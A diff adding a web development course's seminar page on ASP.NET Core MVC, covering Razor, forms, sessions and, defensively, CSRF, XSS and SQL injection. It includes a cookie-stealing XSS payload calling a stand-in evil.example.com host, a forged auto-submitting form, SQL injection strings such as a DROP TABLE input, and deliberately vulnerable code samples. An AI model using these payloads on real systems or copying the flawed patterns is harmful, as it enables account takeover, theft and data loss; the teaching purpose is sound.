@@ -1,14 +1,808 @@
 ---
 title: "MVC"
-description: "Advanced MVC concepts, building sophisticated web applications with the MVC pattern, and integrating .NET Identity for secure user management."
+description: "Milestone 2 deadline and interim test feedback, core principles of MVC in ASP.NET Core, Razor syntax, layouts, sections and partial views, passing data with ViewData, ViewBag, TempData and sessions, using JavaScript libraries, HTML forms with model binding, validation, hidden inputs and anti-forgery tokens, and preventing XSS and SQL injection."
 order: 9
 recommendedStudyFrom: "2026-11-16"
 recommendedStudyTo: "2026-11-22"
 availableFrom: "2026-11-16"
 tags:
+  - milestone
+  - interim-test
   - mvc
-  - dotnet-identity
+  - razor
+  - partial-views
+  - sessions
+  - html-forms
+  - csrf
+  - xss
+  - sql-injection
 ---
 
+# Agenda
+
+1. Milestone 2 Deadline
+2. Interim Test Feedback
+3. MVC
+4. HTML Forms
+5. XSS
+6. SQL Injection
+7. Today's Assignment
+
+# Milestone 2 Deadline
+
+The deadline for **Milestone 2** is **20.11.2026 23:59**.
+
+> [!IMPORTANT]
+> We won't be strictly checking for exactly 23:59, a few minutes of delay are okay. But **don't forget to submit**, a missed milestone is a missed milestone!
+
+> [!NOTE]
+> Teams reviewed by **Dominik Borbuliak** won't get feedback right away on Saturday, because I'll be **out of town**. I'll go through the submissions **during the following week**, roughly **1 or 2 teams per day**, so expect your feedback to arrive gradually.
+
+# Interim Test Feedback
+
+Overall, the results were **not bad, but not ideal either**.
+
+- The **most difficult part** seemed to be **dependency injection**
+- A lot of you answered that `IOrderService` should be registered as a **Singleton**
+- Some of you **skipped a subquestion completely**. You didn't have to write any code, a short explanation was enough:
+  - Register it in `Program.cs` on `builder.Services`, e.g. `builder.Services.AddScoped<IOrderService, OrderService>()`
+  - Use the **Scoped** lifetime, so there is one instance per HTTP request (it depends on the `DbContext`, which is scoped too)
+  - It is then **injected through the constructor** of the class that needs it
+
+> [!IMPORTANT]
+> Let's discuss:
+>
+> - Why did so many of you pick **Singleton** for `IOrderService`? Did we explain lifetimes poorly, did you forget, or was it something else?
+> - How did the test feel **from your point of view**?
+> - Would you prefer an **oral exam** instead of a written one?
+
+# MVC
+
+## Core Principles
+
+**MVC** (Model-View-Controller) splits the presentation layer into three parts, each with **one responsibility**:
+
+| Part           | Responsibility                                                                       | In ASP.NET Core                               |
+| -------------- | ------------------------------------------------------------------------------------ | --------------------------------------------- |
+| **Model**      | The data the view shows or the form sends. No knowledge of HTML                      | View models / DTOs (`ProductDetailViewModel`) |
+| **View**       | Turns the model into HTML. **No business logic**, only presentation                  | Razor files (`.cshtml`)                       |
+| **Controller** | Handles the request: reads input, calls the business layer, picks a view or redirect | Classes deriving from `Controller`            |
+
+```plain
+GET /Products/Detail/5
+        │
+        ▼
+     Routing ──► ProductsController.Detail(5) ──► IProductService (business layer)
+                            │
+                            ▼
+                 return View(viewModel)
+                            │
+                            ▼
+              Views/Products/Detail.cshtml ──► HTML ──► Browser
+```
+
+- Controllers should be **thin**: no database queries, no business rules. They delegate to services (as in our 3-layered architecture)
+- Views should be **dumb**: they only display what the controller gives them
+- The controller and the view communicate through the **model**, so either side can change without breaking the other
+
+## Conventions
+
+ASP.NET Core MVC relies on **conventions** instead of configuration:
+
+```plain
+Controllers/
+    ProductsController.cs        → /Products/{action}/{id?}
+Views/
+    _ViewImports.cshtml          → @using and @addTagHelper shared by all views
+    _ViewStart.cshtml            → sets Layout = "_Layout" for all views
+    Shared/
+        _Layout.cshtml           → the common page frame (header, menu, footer)
+        _ProductCard.cshtml      → a partial view (note the underscore)
+    Products/
+        Index.cshtml             → returned by ProductsController.Index()
+        Detail.cshtml            → returned by ProductsController.Detail()
+```
+
+```csharp
+public class ProductsController(IProductService productService) : Controller
+{
+    public async Task<IActionResult> Index()
+    {
+        var products = await productService.GetAllAsync();
+        return View(products); // → Views/Products/Index.cshtml
+    }
+
+    public async Task<IActionResult> Detail(int id)
+    {
+        var product = await productService.GetByIdAsync(id);
+        if (product is null)
+        {
+            return NotFound();
+        }
+
+        return View(product); // → Views/Products/Detail.cshtml
+    }
+}
+```
+
+## How `View()` Finds the View
+
+`View()` doesn't take a file path, only a **view name**. MVC then **searches** for the file in a fixed order and uses the **first one it finds**:
+
+| Call                                 | View name                         | Searched locations (in order)                                 |
+| ------------------------------------ | --------------------------------- | ------------------------------------------------------------- |
+| `View()` / `View(model)`             | Name of the **action** (`Detail`) | `Views/Products/Detail.cshtml` → `Views/Shared/Detail.cshtml` |
+| `View("Edit", model)`                | `Edit`                            | `Views/Products/Edit.cshtml` → `Views/Shared/Edit.cshtml`     |
+| `View("~/Views/Admin/Stats.cshtml")` | An exact path                     | Only that file, **no search**                                 |
+
+- `Products` comes from the **controller name** without the `Controller` suffix
+- The view name comes from the **action**, so a `[HttpPost] Create` action that calls `return View(model)` renders the same `Create.cshtml` as the `[HttpGet] Create`. That's how a form with errors is shown again
+- That's why views used by **one controller** go into its folder, and views used by **several controllers** (like a shared `Error.cshtml`) go into `Views/Shared/`
+- If no file is found, you get an `InvalidOperationException` that **lists all the locations** it tried, which is the first thing to check when a view "can't be found"
+
+## Razor Syntax
+
+Razor mixes HTML with C#. The **`@`** character switches from HTML to C#, and Razor figures out where the C# ends:
+
+| Syntax                        | Meaning                                                                   |
+| ----------------------------- | ------------------------------------------------------------------------- |
+| `@model ProductDto`           | Declares the type of the model (lowercase `m`)                            |
+| `@Model.Name`                 | Outputs a value of the model (uppercase `M`), **HTML-encoded**            |
+| `@(Model.Price * 1.21m)`      | Explicit expression: use parentheses when it contains spaces or operators |
+| `@{ var total = 0; }`         | Code block: plain C# statements, nothing is output                        |
+| `@if (...) { }`, `@foreach`   | Control flow; inside the braces you are back in HTML                      |
+| `@: text`, `<text>...</text>` | Output plain text inside a code block                                     |
+| `@* comment *@`               | Razor comment, not sent to the browser (unlike `<!-- -->`)                |
+| `@@`                          | A literal `@` (e-mail addresses like `a@b.cz` are detected automatically) |
+| `asp-for`, `asp-action`, ...  | **Tag helpers**: C#-aware attributes on normal HTML elements              |
+
+```xml
+@model IEnumerable<ProductDto>
+
+@{
+    ViewData["Title"] = "Products";
+    var count = Model.Count();
+}
+
+<h1>Products (@count)</h1>
+
+@if (!Model.Any())
+{
+    <p>No products yet.</p>
+}
+else
+{
+    <ul>
+        @foreach (var product in Model)
+        {
+            <li>
+                <a asp-action="Detail" asp-route-id="@product.Id">@product.Name</a>
+                - @product.Price.ToString("C")
+                @* Generates: <a href="/Products/Detail/5">...</a> *@
+            </li>
+        }
+    </ul>
+}
+```
+
+> [!TIP]
+> Prefer **tag helpers** (`<a asp-action="Detail">`) over hard-coded URLs (`<a href="/Products/Detail">`). They are generated from your routes, so renaming a route doesn't break your links.
+
+## Layouts and Sections
+
+The **layout** is the frame around every page. `@RenderBody()` is where the content of the current view goes:
+
+```xml
+<!-- Views/Shared/_Layout.cshtml -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>@ViewData["Title"] - Eshop</title>
+    <link rel="stylesheet" href="~/css/site.css" />
+    @await RenderSectionAsync("Styles", required: false)
+</head>
+<body>
+    <partial name="_Navigation" />
+
+    <main>
+        @RenderBody()
+    </main>
+
+    <script src="~/lib/jquery/dist/jquery.min.js"></script>
+    @await RenderSectionAsync("Scripts", required: false)
+</body>
+</html>
+```
+
+A **section** lets a view put content into a **specific place in the layout**, typically page-specific scripts at the end of `<body>`, after the shared libraries are loaded:
+
+```xml
+<!-- Views/Products/Create.cshtml -->
+<h1>New product</h1>
+<!-- ... the form ... -->
+
+@section Scripts {
+    <partial name="_ValidationScriptsPartial" />
+    <script src="~/js/product-form.js"></script>
+}
+```
+
+- `required: false` means views **may** define the section. With `required: true`, every view must define it, otherwise you get an error at runtime
+- A section defined in the view but not rendered in the layout is also an error
+
+## Partial Views
+
+A **partial view** is a reusable piece of a view. Use it for markup that repeats on several pages (a product card, a navigation menu) or to split a long view into smaller parts:
+
+```xml
+<!-- Views/Shared/_ProductCard.cshtml -->
+@model ProductDto
+
+<div class="card">
+    <h3>@Model.Name</h3>
+    <p>@Model.Price.ToString("C")</p>
+    <a asp-controller="Products" asp-action="Detail" asp-route-id="@Model.Id">Detail</a>
+</div>
+```
+
+```xml
+<!-- Views/Products/Index.cshtml -->
+@model IEnumerable<ProductDto>
+
+@foreach (var product in Model)
+{
+    <partial name="_ProductCard" model="product" />
+}
+```
+
+- The name starts with an **underscore** by convention, so it's clear it isn't a full page
+- Partials are found **the same way as views** (see above). When `Views/Products/Index.cshtml` renders `<partial name="_ProductCard" />`, MVC tries `Views/Products/_ProductCard.cshtml` first, then `Views/Shared/_ProductCard.cshtml`. So a partial used only by the views of one controller goes into its folder, a partial used across controllers goes into `Views/Shared/`
+- A partial has **no logic of its own**: it only gets the model passed to it. If a reusable piece needs to **load its own data** (e.g. a shopping cart counter in the header), use a **view component** instead
+
+> [!NOTE]
+> Partial vs layout vs section: a **layout** wraps the view, a **partial** is inserted into the view, and a **section** is a hole in the layout that the view fills.
+
+## Passing Data to Views
+
+| Way                       | Lifetime                                  | Typed? | Typical use                                          |
+| ------------------------- | ----------------------------------------- | ------ | ---------------------------------------------------- |
+| **Model** (`View(model)`) | Current request                           | ✓      | The main data of the page. **Prefer this**           |
+| `ViewData["Key"]`         | Current request                           | ✗      | Small extras: page title, a dropdown list            |
+| `ViewBag.Key`             | Current request                           | ✗      | The same as `ViewData`, only with `dynamic` syntax   |
+| `TempData["Key"]`         | **Until it's read** (survives a redirect) | ✗      | One-time messages after a redirect ("Product saved") |
+| **Session**               | Across requests of one user               | ✗      | Per-user state: shopping cart, wizard steps          |
+| Route / query string      | Current request                           | ✓      | Ids, filters, page numbers: `/Products?page=2`       |
+
+### Writing (in the Controller)
+
+```csharp
+public async Task<IActionResult> Index(int page = 1) // ← /Products?page=2 (query string)
+{
+    var products = await productService.GetPageAsync(page);
+    return View(products); // ← the model
+}
+
+public IActionResult Create()
+{
+    ViewData["Title"] = "New product";
+    ViewBag.Categories = new SelectList(categories, "Id", "Name"); // same storage as ViewData
+    return View(new CreateProductViewModel());
+}
+
+[HttpPost]
+[ValidateAntiForgeryToken]
+public async Task<IActionResult> Create(CreateProductViewModel model)
+{
+    // ...
+    TempData["Message"] = "Product created.";
+    return RedirectToAction(nameof(Index)); // ViewData would be lost here, TempData survives
+}
+```
+
+### Reading (in the View)
+
+```xml
+<!-- Views/Products/Create.cshtml -->
+@* The model: typed, IntelliSense works *@
+@model CreateProductViewModel
+
+@* ViewData: by key, returns object *@
+<h1>@ViewData["Title"]</h1>
+
+@* ViewBag: the same value as ViewData["Categories"] *@
+<select asp-for="CategoryId" asp-items="ViewBag.Categories"></select>
+```
+
+```xml
+<!-- Views/Products/Index.cshtml, shown after the redirect -->
+@model IEnumerable<ProductDto>
+
+@* TempData: reading it removes it *@
+@if (TempData["Message"] is string message)
+{
+    <div class="alert alert-success">@message</div>
+}
+```
+
+- `ViewData` returns `object`, so anything other than output needs a **cast** (`(SelectList)ViewData["Categories"]`). `ViewBag` is `dynamic`, so it needs no cast, but also gets no compile-time checks
+- `TempData` is deleted **after it's read**. Use `TempData.Peek("Message")` to read it without deleting it
+- Values from the route or query string are read as **action parameters** (`int page` above), see Model Binding below. Session values are read with `HttpContext.Session` in the controller, see Sessions below
+
 > [!WARNING]
-> Work in progress.
+> `ViewData` and `ViewBag` are **not typed**: a typo in the key compiles fine and fails silently at runtime. Use them only for small extras. If a view needs more data, add it to the **view model**.
+
+## Sessions
+
+HTTP is **stateless**, so every request is independent. A **session** stores data per user on the server. The browser only gets a cookie with the **session id**:
+
+```csharp
+// Program.cs
+builder.Services.AddDistributedMemoryCache(); // where session data is stored
+builder.Services.AddSession(options =>
+{
+    options.IdleTimeout = TimeSpan.FromMinutes(30);
+    options.Cookie.HttpOnly = true;
+    options.Cookie.IsEssential = true;
+});
+
+var app = builder.Build();
+// ...
+app.UseRouting();
+app.UseSession(); // after UseRouting, before the endpoints
+app.MapControllerRoute(/* ... */);
+```
+
+```csharp
+public IActionResult AddToCart(int productId)
+{
+    var cart = HttpContext.Session.GetString("Cart") is { } json
+        ? JsonSerializer.Deserialize<List<int>>(json)!
+        : [];
+
+    cart.Add(productId);
+    HttpContext.Session.SetString("Cart", JsonSerializer.Serialize(cart));
+
+    return RedirectToAction(nameof(Index));
+}
+```
+
+- The session only stores `string`, `int` and `byte[]`, so objects have to be **serialized** (e.g. to JSON)
+- With the in-memory cache, session data is **lost on restart** and **isn't shared** between multiple instances of the app. For that, use a distributed cache (Redis, SQL Server)
+- Keep sessions **small** and don't store anything you can't afford to lose. Important data (orders, a persistent cart) belongs in the **database**
+
+## Using JavaScript Libraries
+
+MVC renders HTML on the server, but that doesn't mean **no JavaScript**. You can use any JS library when you need it: for interactive widgets, charts, date pickers or notifications. Many of them come with a **NuGet package** that integrates them with ASP.NET Core.
+
+Example: toast notifications with [ToastNotification](https://github.com/codewithmukesh/ToastNotification):
+
+```bash
+dotnet add package AspNetCoreHero.ToastNotification
+```
+
+```csharp
+// Program.cs
+builder.Services.AddNotyf(config =>
+{
+    config.DurationInSeconds = 5;
+    config.Position = NotyfPosition.BottomRight;
+    config.IsDismissable = true;
+});
+
+var app = builder.Build();
+// ...
+app.UseRouting();
+app.UseNotyf(); // also shows toasts raised during fetch / AJAX calls
+```
+
+```xml
+<!-- Views/Shared/_Layout.cshtml, just before </body> -->
+@await Component.InvokeAsync("Notyf")
+```
+
+```csharp
+public class ProductsController(IProductService productService, INotyfService notyf) : Controller
+{
+    [HttpPost]
+    [ValidateAntiForgeryToken]
+    public async Task<IActionResult> Delete(int id)
+    {
+        await productService.DeleteAsync(id);
+        notyf.Success("Product deleted.");
+        return RedirectToAction(nameof(Index)); // the toast shows on the next page
+    }
+}
+```
+
+- Other methods: `notyf.Error(...)`, `notyf.Warning(...)`, `notyf.Information(...)`
+- It uses **`TempData`** under the hood, so the toast survives the redirect
+
+> [!TIP]
+> For libraries without a NuGet package, add their files to `wwwroot/lib/` or load them from a CDN, and include them in the layout or in the `Scripts` section of a view.
+
+> [!TIP]
+> [MS Learn: Overview of ASP.NET Core MVC](https://learn.microsoft.com/en-us/aspnet/core/mvc/overview) · [Razor syntax reference](https://learn.microsoft.com/en-us/aspnet/core/mvc/views/razor) · [Partial views](https://learn.microsoft.com/en-us/aspnet/core/mvc/views/partial) · [Session and state management](https://learn.microsoft.com/en-us/aspnet/core/fundamentals/app-state)
+
+# HTML Forms
+
+## The Basics
+
+A form sends the values of its inputs to the server. Each input is sent under its **`name`**:
+
+```xml
+<form action="/Products/Create" method="post">
+    <input name="Name" type="text" />
+    <input name="Price" type="number" />
+    <button type="submit">Save</button>
+</form>
+```
+
+- `method="get"`: values go into the **query string** (`?Name=...&Price=...`). Use it for **reading**: search, filters, pagination
+- `method="post"`: values go into the **request body**. Use it for anything that **changes data**
+
+## Forms in MVC
+
+In MVC you don't write `name` and `action` by hand, the **tag helpers** generate them from the model:
+
+```csharp
+public class CreateProductViewModel
+{
+    [Required, StringLength(100)]
+    public string Name { get; set; } = string.Empty;
+
+    [Range(0.01, 100_000)]
+    public decimal Price { get; set; }
+
+    [Display(Name = "Category")]
+    public int CategoryId { get; set; }
+}
+```
+
+```xml
+@model CreateProductViewModel
+
+<form asp-action="Create" method="post">
+    <div asp-validation-summary="ModelOnly"></div>
+
+    <label asp-for="Name"></label>
+    <input asp-for="Name" />
+    <span asp-validation-for="Name"></span>
+
+    <label asp-for="Price"></label>
+    <input asp-for="Price" />
+    <span asp-validation-for="Price"></span>
+
+    <label asp-for="CategoryId"></label>
+    <select asp-for="CategoryId" asp-items="ViewBag.Categories"></select>
+
+    <button type="submit">Save</button>
+</form>
+
+@section Scripts {
+    <partial name="_ValidationScriptsPartial" />
+}
+```
+
+- `asp-for` generates `id`, `name`, `type` (from the C# type) and the **validation attributes** (from the data annotations)
+- `asp-validation-for` shows the error message of that property, `asp-validation-summary` shows all (or only model-level) errors
+- `_ValidationScriptsPartial` enables **client-side validation**, so errors show before the form is even sent
+
+## Model Binding and Validation
+
+You never read the request by hand. When an action has parameters, MVC **creates them for you** from the values in the request. This is called **model binding**.
+
+Submitting the form above sends this request body:
+
+```plain
+POST /Products/Create
+
+Name=Phone&Price=199.90&CategoryId=3
+```
+
+The action has a parameter `CreateProductViewModel model`, so MVC creates a new `CreateProductViewModel` and goes through its properties. For each property, it looks for a value **with the same name** in the request and converts it to the property's type:
+
+| Property     | Value in the request | Result    |
+| ------------ | -------------------- | --------- |
+| `Name`       | `Name=Phone`         | `"Phone"` |
+| `Price`      | `Price=199.90`       | `199.90m` |
+| `CategoryId` | `CategoryId=3`       | `3`       |
+
+- The same works for **simple parameters**: `Edit(int id)` gets `id` from the route (`/Products/Edit/5`), `Index(int page)` from the query string (`?page=2`)
+- That's why the `name` of an input matters, and why `asp-for` generates it from the property name
+- If a value **can't be converted** (`Price=abc`) or **breaks a validation attribute** (`[Required]`, `[Range]`), MVC records an error in **`ModelState`**. The action is still called, so you have to check it:
+
+```csharp
+[HttpGet]
+public async Task<IActionResult> Create()
+{
+    await LoadCategoriesAsync();
+    return View(new CreateProductViewModel());
+}
+
+[HttpPost]
+[ValidateAntiForgeryToken]
+public async Task<IActionResult> Create(CreateProductViewModel model)
+{
+    if (!ModelState.IsValid)
+    {
+        // Show the same form again, with the values and the error messages
+        await LoadCategoriesAsync();
+        return View(model);
+    }
+
+    await productService.CreateAsync(model.Name, model.Price, model.CategoryId);
+    return RedirectToAction(nameof(Index));
+}
+
+private async Task LoadCategoriesAsync()
+{
+    var categories = await categoryService.GetAllAsync();
+    ViewBag.Categories = new SelectList(categories, "Id", "Name");
+}
+```
+
+> [!NOTE]
+> The POST is a **new request**, so the `ViewBag.Categories` set in the GET action is gone. Only the values of the form inputs come back. Without filling it again before `return View(model)`, the form is shown with an **empty dropdown**.
+
+> [!CAUTION]
+> Client-side validation is only for **user comfort**, anyone can turn it off or send the request directly. **Always check `ModelState.IsValid` on the server.**
+
+> [!WARNING]
+> Bind to a **view model**, never to an **entity**. The model binder fills **every property it finds in the request**, so with an entity an attacker can just add `IsAdmin=true` or `Price=0` to the form (**overposting**).
+
+## Hidden Inputs
+
+A **hidden input** is sent with the form like any other input, but the user doesn't see it. It's used for values the form needs but the user shouldn't edit, typically the **id** of the record being edited:
+
+```xml
+@model EditProductViewModel
+
+<form asp-action="Edit" method="post">
+    <input type="hidden" asp-for="Id" />
+    <!-- or: <input asp-for="Id" /> with [HiddenInput] on the property -->
+
+    <label asp-for="Name"></label>
+    <input asp-for="Name" />
+
+    <button type="submit">Save</button>
+</form>
+```
+
+Renders as:
+
+```xml
+<input type="hidden" id="Id" name="Id" value="42" />
+```
+
+> [!CAUTION]
+> "Hidden" only means **not displayed**. Anyone can open the developer tools and change the value, or send any value they want. Treat it like **any other user input**: on the server, check that the record exists and that the current user is **allowed to edit it**. Never put prices, roles or other values you trust into hidden inputs.
+
+## Anti-Forgery Tokens (CSRF)
+
+**CSRF** (Cross-Site Request Forgery) abuses the fact that the browser **sends cookies automatically** with every request to a site, no matter which page started it:
+
+1. You are logged into `eshop.example.com`, so your browser has its auth cookie
+2. You open `evil.example.com`, which contains a hidden form that submits itself:
+
+```xml
+<form action="https://eshop.example.com/Account/ChangeEmail" method="post">
+    <input type="hidden" name="Email" value="attacker@evil.example.com" />
+</form>
+<script>document.forms[0].submit();</script>
+```
+
+3. The browser sends the request **with your cookie**, so the eshop thinks it's you, and the e-mail of your account is changed
+
+> [!NOTE]
+> Modern browsers and ASP.NET Core set auth cookies to **`SameSite=Lax`** by default, which stops sending them on cross-site POSTs, so this exact attack would fail today. But that's only a **partial defence**: it doesn't apply to cookies with `SameSite=None`, to older browsers, or to requests from **subdomains** (`blog.eshop.example.com` counts as the same site). That's why we still use anti-forgery tokens.
+
+**The fix: an anti-forgery token.** The server adds a random token to every form, and only accepts the POST if the token is sent back:
+
+```xml
+<!-- Generated automatically by the form tag helper for method="post" -->
+<input name="__RequestVerificationToken" type="hidden" value="CfDJ8N..." />
+```
+
+- The token is also stored in a **cookie**, and `[ValidateAntiForgeryToken]` checks that both **match**
+- The attacker's page **can't read** the token from our page (the browser's same-origin policy forbids it), so it can't put a valid one into its forged form
+- `<form asp-action="...">` adds the hidden field **automatically**. With a hand-written `<form action="...">`, add `@Html.AntiForgeryToken()` yourself
+
+```csharp
+// Instead of adding [ValidateAntiForgeryToken] to every POST action,
+// validate it for all unsafe methods (POST, PUT, DELETE) globally:
+builder.Services.AddControllersWithViews(options =>
+{
+    options.Filters.Add(new AutoValidateAntiforgeryTokenAttribute());
+});
+```
+
+> [!IMPORTANT]
+> This is also why actions that **change data** must never be `GET`. A link like `<a href="https://eshop.example.com/Products/Delete/5">Win a prize!</a>` on any page would delete the product when you click it: `SameSite=Lax` cookies **are sent** when you navigate to a site with a link, and GET requests aren't checked for the token.
+
+> [!TIP]
+> [MS Learn: Tag Helpers in forms](https://learn.microsoft.com/en-us/aspnet/core/mvc/views/working-with-forms) · [Model validation](https://learn.microsoft.com/en-us/aspnet/core/mvc/models/validation) · [Prevent CSRF attacks](https://learn.microsoft.com/en-us/aspnet/core/security/anti-request-forgery)
+
+# XSS
+
+**Cross-Site Scripting (XSS)**: an attacker gets **their JavaScript** to run in **another user's browser**, on your site. The script then can do anything the user can: read the page, send requests in their name, steal data.
+
+| Type          | Where the script comes from                                                               |
+| ------------- | ----------------------------------------------------------------------------------------- |
+| **Stored**    | Saved in the database (a review, a username) and shown to everyone who opens the page     |
+| **Reflected** | Part of the URL (`?search=...`), shown back on the page. The victim clicks a crafted link |
+
+## Example: Stored XSS
+
+The eshop lets users write product reviews. An attacker submits this review:
+
+```xml
+Great product! <script>fetch("https://evil.example.com/steal?c=" + document.cookie)</script>
+```
+
+The review is saved, and the product page renders it without encoding:
+
+```xml
+@foreach (var review in Model.Reviews)
+{
+    <p>@Html.Raw(review.Text)</p> @* ✗ outputs the text as HTML *@
+}
+```
+
+Every visitor of the product page now **runs the attacker's script**, which sends their cookies to the attacker.
+
+## Razor Protects You by Default
+
+`@` **HTML-encodes** everything it outputs, so the same review is harmless:
+
+```xml
+<p>@review.Text</p> @* ✓ *@
+```
+
+```xml
+<!-- What the browser gets: displayed as text, not executed -->
+<p>Great product! &lt;script&gt;fetch(...)&lt;/script&gt;</p>
+```
+
+The danger is in the places where you **turn this off** or where HTML encoding **isn't enough**:
+
+```xml
+@* ✗ Html.Raw: no encoding at all *@
+<div>@Html.Raw(Model.Description)</div>
+
+@* ✗ Inside <script>, HTML encoding doesn't protect you *@
+<script>var name = '@Model.Name';</script>
+
+@* ✓ Serialize to JSON instead, it escapes the value for JavaScript *@
+<script>var name = @Json.Serialize(Model.Name);</script>
+
+@* ✗ A URL from the user: "javascript:alert(1)" contains nothing to encode *@
+<a href="@Model.Website">Website</a>
+@* ✓ Validate on input that it starts with http:// or https:// *@
+```
+
+> [!WARNING]
+> Watch out for libraries that render **HTML**: the [ToastNotification](https://github.com/codewithmukesh/ToastNotification) messages from above are rendered as HTML, so `notyf.Error($"Could not save {model.Name}")` is an XSS hole. Encode user input first: `HtmlEncoder.Default.Encode(model.Name)`.
+
+## Prevention
+
+- **Don't use `Html.Raw`** on anything a user could have influenced. If you really need user-provided HTML (rich text editor), clean it with a **sanitizer** (e.g. the `HtmlSanitizer` NuGet package) that only keeps safe tags
+- Use **`@`** for output in HTML and **`@Json.Serialize`** for values in JavaScript
+- **Validate input**: allowed characters, URL schemes, lengths
+- Keep auth cookies **`HttpOnly`** (Identity does by default), so `document.cookie` can't read them. This limits the damage, but the script can still act in the user's name
+- **Content Security Policy** (CSP): a response header that tells the browser which scripts may run, e.g. only from your own domain and no inline scripts
+
+> [!TIP]
+> [MS Learn: Prevent Cross-Site Scripting (XSS)](https://learn.microsoft.com/en-us/aspnet/core/security/cross-site-scripting) · [OWASP: XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+
+# SQL Injection
+
+**SQL injection**: user input is put **directly into an SQL query**, so the attacker can change the **meaning of the query** instead of just its values.
+
+## Example
+
+A login that builds the query with string concatenation:
+
+```csharp
+// ✗ NEVER do this
+var sql = "SELECT * FROM Users WHERE Email = '" + email + "' AND Password = '" + password + "'";
+var user = await db.Users.FromSqlRaw(sql).FirstOrDefaultAsync();
+```
+
+With normal input, the query is what you'd expect:
+
+```sql
+SELECT * FROM Users WHERE Email = 'jan@muni.cz' AND Password = 'secret'
+```
+
+But if the attacker enters `admin@eshop.cz' --` as the e-mail:
+
+```sql
+SELECT * FROM Users WHERE Email = 'admin@eshop.cz' --' AND Password = '...'
+```
+
+The `'` closes the string and `--` turns the rest into a **comment**, so the password check is gone and the attacker is logged in as the admin. Other inputs do even more damage:
+
+| Input                     | Resulting query does                                      |
+| ------------------------- | --------------------------------------------------------- |
+| `' OR 1=1 --`             | Condition is always true → returns **all users**          |
+| `'; DROP TABLE Users; --` | Runs a second command → **deletes the table**             |
+| `' UNION SELECT ... --`   | Appends rows from **other tables** (password hashes, ...) |
+
+## Prevention: Parameterized Queries
+
+The fix is to never build SQL from input, but send the values as **parameters**. The database then always treats them as **data**, never as SQL, no matter which characters they contain:
+
+```csharp
+// ✓ LINQ: EF Core always generates parameterized SQL
+var user = await db.Users.FirstOrDefaultAsync(u => u.Email == email);
+
+// ✓ FromSql / FromSqlInterpolated: the interpolated values become parameters
+var products = await db.Products
+    .FromSql($"SELECT * FROM Products WHERE Name LIKE {"%" + search + "%"}")
+    .ToListAsync();
+
+// ✓ FromSqlRaw with explicit parameters
+var products2 = await db.Products
+    .FromSqlRaw("SELECT * FROM Products WHERE CategoryId = {0}", categoryId)
+    .ToListAsync();
+```
+
+```sql
+-- What the database gets: the value is separate from the query
+SELECT * FROM Products WHERE Name LIKE @p0   -- @p0 = '%'' OR 1=1 --%'
+```
+
+> [!CAUTION]
+> The **same** interpolated string is safe in `FromSql`, but **dangerous** in `FromSqlRaw`:
+>
+> ```csharp
+> db.Products.FromSql($"... WHERE Name = {name}");     // ✓ name becomes a parameter
+> db.Products.FromSqlRaw($"... WHERE Name = {name}");  // ✗ name is pasted into the SQL
+> ```
+>
+> `FromSql` takes a `FormattableString` and turns the holes into parameters. `FromSqlRaw` takes a plain `string`, so the interpolation happens **before** EF Core sees it. The same applies to `ExecuteSql` vs `ExecuteSqlRaw`.
+
+- Stay with **LINQ** whenever you can. Raw SQL is only for the rare cases LINQ can't express
+- The database user of the app should have **only the permissions it needs** (no `DROP`, no access to other databases), which limits the damage if something slips through
+
+> [!TIP]
+> [MS Learn: SQL Queries in EF Core](https://learn.microsoft.com/en-us/ef/core/querying/sql-queries) · [OWASP: SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
+
+# Today's Assignment
+
+- You can download today's assignment here: [Seminar-09](https://gitlab.fi.muni.cz/pv179/seminar-09-2026-mvc)
+- Follow the instructions in the assignment
+- I'll go around and check how you're doing
+
+> [!IMPORTANT]
+> Feel free to ask any questions or ask for help at any point!
+
+# Summary
+
+✓ Milestone 2 deadline (20.11.2026 23:59) communicated
+
+✓ Interim test feedback discussed
+
+✓ MVC principles, conventions, view lookup and Razor syntax explained
+
+✓ Layouts, sections and partial views used to structure views
+
+✓ Data passed to views with the model, ViewData, ViewBag, TempData and sessions
+
+✓ JS libraries used in MVC (toast notifications)
+
+✓ HTML forms built with tag helpers, model binding, validation, and hidden inputs
+
+✓ CSRF explained and prevented with anti-forgery tokens
+
+✓ XSS explained and prevented with encoding, sanitizing and CSP
+
+✓ SQL injection explained and prevented with parameterized queries
+
+✓ Today's assignment downloaded
+
+> [!NOTE]
+> **Next time:** Reflection, Entity Framework and expression trees.
+
+> [!IMPORTANT]
+> Any questions?
